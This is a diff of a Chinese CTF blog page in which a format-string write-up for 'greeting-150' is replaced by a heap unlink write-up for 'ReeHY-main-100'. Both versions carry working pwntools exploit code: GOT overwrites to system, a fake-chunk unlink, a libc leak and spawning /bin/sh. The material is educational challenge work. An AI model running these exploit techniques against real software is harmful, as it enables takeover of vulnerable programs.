@@ -15,22 +15,22 @@
 
 
 
-<meta name="description" content="一道比较好的格式化字符串，通过这道题目可以有效训练自己构造payload的能力">
+<meta name="description" content="又是撸了一天的unlink，pwn真的是让人上头呢。这次找的是攻防世界中的一道题目。这道题在当时做的时候使用的是栈溢出的做法，但是看了wp发现其实还是有利用unlink来解题的办法的。这次就花点时间把这道题给复盘一下。">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mma-ctf-2nd-2016-greeting-150">
-<meta property="og:url" content="http://yoursite.com/2019/11/18/mma-ctf-2nd-2016-greeting-150/index.html">
+<meta property="og:title" content="ReeHY-mian-100-Unlink">
+<meta property="og:url" content="http://yoursite.com/2020/02/17/ReeHY-mian-100-Unlink/index.html">
 <meta property="og:site_name" content="good good study,day day up!">
-<meta property="og:description" content="一道比较好的格式化字符串，通过这道题目可以有效训练自己构造payload的能力">
+<meta property="og:description" content="又是撸了一天的unlink，pwn真的是让人上头呢。这次找的是攻防世界中的一道题目。这道题在当时做的时候使用的是栈溢出的做法，但是看了wp发现其实还是有利用unlink来解题的办法的。这次就花点时间把这道题给复盘一下。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/img/greeting/1.jpg">
-<meta property="og:image" content="http://yoursite.com/img/greeting/2.jpg">
-<meta property="og:image" content="http://yoursite.com/img/greeting/3.jpg">
-<meta property="og:updated_time" content="2020-02-13T06:42:11.064Z">
+<meta property="og:image" content="http://yoursite.com/img/ReeHY-main/1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/ReeHY-main/2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/ReeHY-main/3.jpg">
+<meta property="og:updated_time" content="2020-02-17T10:17:01.267Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mma-ctf-2nd-2016-greeting-150">
-<meta name="twitter:description" content="一道比较好的格式化字符串，通过这道题目可以有效训练自己构造payload的能力">
-<meta name="twitter:image" content="http://yoursite.com/img/greeting/1.jpg">
+<meta name="twitter:title" content="ReeHY-mian-100-Unlink">
+<meta name="twitter:description" content="又是撸了一天的unlink，pwn真的是让人上头呢。这次找的是攻防世界中的一道题目。这道题在当时做的时候使用的是栈溢出的做法，但是看了wp发现其实还是有利用unlink来解题的办法的。这次就花点时间把这道题给复盘一下。">
+<meta name="twitter:image" content="http://yoursite.com/img/ReeHY-main/1.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -62,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>mma-ctf-2nd-2016-greeting-150 | good good study,day day up!</title>
+<title>ReeHY-mian-100-Unlink | good good study,day day up!</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -262,11 +262,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-mma-ctf-2nd-2016-greeting-150" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ReeHY-mian-100-Unlink" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/11/18/mma-ctf-2nd-2016-greeting-150/" class="article-date">
-      <time datetime="2019-11-18T14:14:59.000Z" itemprop="datePublished">2019-11-18</time>
+      <a href="/2020/02/17/ReeHY-mian-100-Unlink/" class="article-date">
+      <time datetime="2020-02-17T04:51:50.000Z" itemprop="datePublished">2020-02-17</time>
 </a>
 
 
@@ -281,7 +281,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      mma-ctf-2nd-2016-greeting-150
+      ReeHY-mian-100-Unlink
     </h1>
   
 
@@ -302,23 +302,31 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>一道比较好的格式化字符串，通过这道题目可以有效训练自己构造payload的能力</p>
+        <p>又是撸了一天的unlink，pwn真的是让人上头呢。这次找的是攻防世界中的一道题目。这道题在当时做的时候使用的是栈溢出的做法，<br>但是看了wp发现其实还是有利用unlink来解题的办法的。这次就花点时间把这道题给复盘一下。</p>
 <a id="more"></a>
-<h2 id="漏洞的大致分析"><a href="#漏洞的大致分析" class="headerlink" title="漏洞的大致分析"></a>漏洞的大致分析</h2><p>我们在linux中分析之后发现这是一个32位的程序，开启了NX保护和canary<br><img src="/img/greeting/1.jpg" alt="avatar"><br>通过ida逆向一下<br><img src="/img/greeting/2.jpg" alt="avatar"><br>我们发现这里有一个很明显的格式化字符串漏洞，这样我们就可以通过修改函数的got表为system的plt来实现我们的目的。</p>
-<h2 id="漏洞的具体利用方式"><a href="#漏洞的具体利用方式" class="headerlink" title="漏洞的具体利用方式"></a>漏洞的具体利用方式</h2><p>我首先使用了一个计算格式化字符串偏移的通用脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># fmt_test.py</span><br><span class="line">#! /usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(&quot;./pwn&quot;)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">print autofmt.offset</span><br></pre></td></tr></table></figure>
 
-<p>得到格式化字符串偏移为12<br>又经过测试：<br><img src="/img/greeting/3.jpg" alt="avatar"><br>这里我们到时候在写payload的时候需要填充两个字符(其实我也不知道为什么……)</p>
-<p>本程序是没有循环的，所以我们需要修改程序的fina_array为start地址，这样就会重新执行一遍，然后执行到我们修改的函数，<br>就可以cat flag<br>所以这样，我们就需要修改的就是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strlen-&gt;system  0x08049A54-&gt; 0x08048490</span><br><span class="line">fina_array-&gt;start  0x08049934-&gt; 0x080484f0</span><br></pre></td></tr></table></figure>
+<h2 id="题目基本分析"><a href="#题目基本分析" class="headerlink" title="题目基本分析"></a>题目基本分析</h2><p>程序是一个64位程序，保护就开了一个nx<br><img src="/img/ReeHY-main/1.jpg" alt="avatar"></p>
+<p>放进ida分析后发现程序逻辑还是比较简单的，下面我们来一个个分析</p>
+<p>1.addnote  这个功能就是比较基础的创建堆，并且记录下了堆的大小，以及指向堆的指针位置，同时要注意的是还自己创建了一个<br>地址来记录下这个堆是否在使用之中，这里是一个要注意的点<br>2.edit 就是一个比较简单的编辑模块，根据我们的索引来对数据进行编辑<br>3.delete 这里有几个漏洞点，一个是函数并没有检验下标为负数的情况，这里我们在delete(-2)时，删除的就是记录已经创建的堆<br>的大小的堆。而由于记录size的堆大小是0x14，被释放后进入fastbin，因此之后重新申请的堆仍然会在这个位置，我们就可以对堆的<br>大小进行修改，从而进行堆溢出。</p>
+<p><img src="/img/ReeHY-main/2.jpg" alt="avatar"></p>
+<p>经过这些分析我们就会发现我们其实可以利用unlink漏洞来使记录指向堆指针的地址记录下这个地址前面一些的地址，这样当我们<br>再次编辑的时候其实编辑的就是这个位置的地址了。</p>
+<h2 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h2><p>我们首先先写好几个我们需要用的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def addnote(size,cun,content):</span><br><span class="line">	p.recvuntil(&apos;$ &apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;size\n&apos;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&apos;cun\n&apos;)</span><br><span class="line">	p.sendline(str(cun))</span><br><span class="line">	p.recvuntil(&apos;content\n&apos;)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">	p.recvuntil(&apos;$ &apos;)</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;dele\n&apos;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">	p.recvuntil(&apos;$ &apos;)</span><br><span class="line">	p.sendline(&apos;3&apos;)</span><br><span class="line">	p.recvuntil(&apos;edit\n&apos;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(&apos;content\n&apos;)</span><br><span class="line">	p.send(content)</span><br></pre></td></tr></table></figure>
 
-<p>这样我们就可以开始构造我们的payload了<br>由于我们要修改的地址较大，在构造payload的时候就要采用%k&amp;hn的方式来修改两个字节，这样可以提高效率</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;aa&apos;</span><br><span class="line">payload += p32(fina_array) </span><br><span class="line">payload += p32(strlen_got+2)</span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += &apos;%34000c%12$hn&apos;  //首先写入(34000+32)个字符来修改fina_array的后两个字节，这里34032=0x84f0</span><br><span class="line">payload += &apos;%33556c%13$hn&apos;  //33556+34032=0x10804，由于hn只写入两个字节，所以0x10000忽略，写入0x804</span><br><span class="line">payload += &apos;%31844c%14$hn&apos;  //31844+0x10804=0x18490,写入0x8490</span><br></pre></td></tr></table></figure>
+<h3 id="修改size以进行堆溢出"><a href="#修改size以进行堆溢出" class="headerlink" title="修改size以进行堆溢出"></a>修改size以进行堆溢出</h3><p>之后我们要先创建好大小合适的两个堆空间，并且使用delete函数修改记录size的堆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addnote(0x100,0,&apos;a&apos;*0x100)</span><br><span class="line">addnote(0x100,1,&apos;b&apos;*0x100)</span><br><span class="line">delete(-2)</span><br><span class="line">payload = p32(0x200)+p32(0x100)</span><br><span class="line">addnote(0x14,2,payload)</span><br></pre></td></tr></table></figure>
 
-<p>至此我们成功构造出了我们的payload</p>
-<h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">#p = remote(&apos;111.198.29.45&apos;,47537)</span><br><span class="line">strlen_got = 0x08049a54</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">fina_array = 0x08049934</span><br><span class="line">start = 0x080484f0</span><br><span class="line">payload = &apos;aa&apos;</span><br><span class="line">payload += p32(fina_array) </span><br><span class="line">payload += p32(strlen_got+2)</span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += &apos;%34000c%12$hn&apos;  </span><br><span class="line">payload += &apos;%33556c%13$hn&apos;  </span><br><span class="line">payload += &apos;%31884c%14$hn&apos;  </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这时候我们其实已经把记录堆的大小的数据给更改了，下面我们就进行堆溢出来构造fakechunk</p>
+<h3 id="构造unlink"><a href="#构造unlink" class="headerlink" title="构造unlink"></a>构造unlink</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ptr = 0x6020e0</span><br><span class="line">fakefd = ptr - 0x18</span><br><span class="line">fakebk = ptr - 0x10</span><br><span class="line">payload = p64(0)+p64(0x100)  #fake chunk&apos;s size and pre_size</span><br><span class="line">payload += p64(fakefd)+p64(fakebk)  </span><br><span class="line">payload +=&apos;a&apos;*(0x100-0x20)  </span><br><span class="line">payload += p64(0x100) #overwrite nextchunk&apos;s pre_size make it believe that prve chunk is free</span><br><span class="line">payload += p64(0x110) </span><br><span class="line">edit(0,payload)</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
 
-<p>通过这道题的学习，自己对格式化字符串的理解加深了不少，其实这类题目最重要的还是payload需要构造的巧妙，只要理解了格式化<br>字符串漏洞，以后面对这一类的问题就能够游刃有余了。</p>
+<p><img src="/img/ReeHY-main/3.jpg" alt="avatar"></p>
+<p>这里我们发现在执行完unlink后ptr[0]已经被修改了</p>
+<h3 id="修改got表进行泄漏"><a href="#修改got表进行泄漏" class="headerlink" title="修改got表进行泄漏"></a>修改got表进行泄漏</h3><p>我们在构造payload的时候需要注意本程序是自己构造了一个地址来记录堆是否在使用之中的，因此我们需要把这和数据加在payloa<br>d中。在泄漏出libc中函数地址后，直接计算出libc基址，就能得到system地址，然后把atoi函数的got表改写成system函数的地址<br>，这样当我们调用atoi函数的时候，其实调用的就是system函数了。<br>这里我们需要注意的一个点就是题目里给的libc其实是不能用的，所以我使用了LibcSearcher。具体使用方法我在之前的文章中已经<br>详细介绍过了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;\x00&apos;*0x18+p64(free_got)+p64(1)+p64(puts_got)+p64(1)+p64(atoi_got)+p64(1)</span><br><span class="line">edit(0,payload)</span><br><span class="line">edit(0,p64(puts_plt)) #when we free(1),we could puts puts_got</span><br><span class="line">delete(2)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr-obj.dump(&apos;puts&apos;)</span><br><span class="line">#libc_base = puts_addr-libc.sym[&apos;puts&apos;]</span><br><span class="line">#system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">system = libc_base + obj.dump(&apos;system&apos;)</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实说白了，unlink漏洞的利用就是一个孰能生巧的过程。我们在这里面主要需要拥有的就是我们自己构造payload的能力，同时还<br>需要我们发现可利用的例如堆溢出方面的漏洞的能力。之前做的几道题目之中，其实很少有一个比较直接的让你去进行堆溢出构造之<br>类的题目，所以重要的还是我们如何能做到溢出，这一点还是需要好好打磨一下的。希望之后的比赛能够取得令自己满意的成绩吧。</p>
 
       
     </div>
@@ -327,13 +335,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/11/18/mma-ctf-2nd-2016-greeting-150/">mma-ctf-2nd-2016-greeting-150</a></p>
+        <p><span>本文标题:</span><a href="/2020/02/17/ReeHY-mian-100-Unlink/">ReeHY-mian-100-Unlink</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HeZhaochen</a></p>
-        <p><span>发布时间:</span>2019-11-18, 22:14:59</p>
-        <p><span>最后更新:</span>2020-02-13, 14:42:11</p>
+        <p><span>发布时间:</span>2020-02-17, 12:51:50</p>
+        <p><span>最后更新:</span>2020-02-17, 18:17:01</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/11/18/mma-ctf-2nd-2016-greeting-150/" title="mma-ctf-2nd-2016-greeting-150">http://yoursite.com/2019/11/18/mma-ctf-2nd-2016-greeting-150/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/11/18/mma-ctf-2nd-2016-greeting-150/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/02/17/ReeHY-mian-100-Unlink/" title="ReeHY-mian-100-Unlink">http://yoursite.com/2020/02/17/ReeHY-mian-100-Unlink/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/02/17/ReeHY-mian-100-Unlink/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -345,16 +353,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/11/20/XCTF-format2-整数溢出/">
-                    XCTF-format2-整数溢出
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/10/17/MCTF初赛WP-1/">
-                    MCTF初赛WP(1)
+                <a href="/2020/02/08/栈溢出的总结/">
+                    栈溢出的总结
                 </a>
             </div>
         
@@ -366,7 +368,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞的大致分析"><span class="toc-number">1.</span> <span class="toc-text">漏洞的大致分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞的具体利用方式"><span class="toc-number">2.</span> <span class="toc-text">漏洞的具体利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整脚本"><span class="toc-number">3.</span> <span class="toc-text">完整脚本</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目基本分析"><span class="toc-number">1.</span> <span class="toc-text">题目基本分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体利用"><span class="toc-number">2.</span> <span class="toc-text">具体利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修改size以进行堆溢出"><span class="toc-number">2.1.</span> <span class="toc-text">修改size以进行堆溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造unlink"><span class="toc-number">2.2.</span> <span class="toc-text">构造unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改got表进行泄漏"><span class="toc-number">2.3.</span> <span class="toc-text">修改got表进行泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
         
     </div>
     <style>
@@ -402,7 +404,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"mma-ctf-2nd-2016-greeting-150　| good good study,day day up!　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ReeHY-mian-100-Unlink　| good good study,day day up!　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -422,15 +424,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/11/20/XCTF-format2-整数溢出/" title="上一篇: XCTF-format2-整数溢出">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/10/17/MCTF初赛WP-1/" title="下一篇: MCTF初赛WP(1)">
+            <a href="/2020/02/08/栈溢出的总结/" title="下一篇: 栈溢出的总结">
                 <i class="fa fa-angle-right"></i>
             </a>
         
